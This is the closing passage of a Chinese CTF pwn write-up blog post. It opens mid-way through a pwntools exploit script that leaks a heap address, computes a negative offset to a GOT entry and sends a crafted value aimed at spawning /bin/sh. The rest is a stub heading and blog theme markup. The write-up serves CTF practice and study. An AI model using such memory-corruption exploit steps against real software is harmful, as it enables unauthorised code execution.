class="hljs-number">128</span><br>sla(<span class="hljs-string">b&#x27;want ? &#x27;</span>, <span class="hljs-built_in">str</span>(size)) <br><br>p.recvuntil(<span class="hljs-string">b&#x27;are: &#x27;</span>) <br>heap = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>size2 = ((heap_addr - <span class="hljs-number">0x404018</span>) // <span class="hljs-number">8</span>) * -<span class="hljs-number">1</span><br>sa(<span class="hljs-string">b&#x27;offset ? &#x27;</span>, size) <br><br>payload = <span class="hljs-number">4199330</span><br>sa(<span class="hljs-string">b&#x27;i thint you may write /bin/sh here&#x27;</span>, payload)<br><br><br>pi()<br></code></pre></td></tr></table></figure>





<h2 id="4-most-safe"><a href="#4-most-safe" class="headerlink" title="4.most safe"></a>4.most safe</h2><p>BF_JIT</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Pwn/" class="category-chain-item">Pwn</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/WP/">#WP</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>二月复现笔记</div>
      <div>http://csc8.github.io/2023/03/03/二月复现笔记/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Csc8</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年3月3日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/03/03/Hgame2023/" title="Hgame_2023">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Hgame_2023</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/12/02/DASCTF10-%20Magic_Book/" title="DASCTF10- Magic_Book">
                        <span class="hidden-mobile">DASCTF10- Magic_Book</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
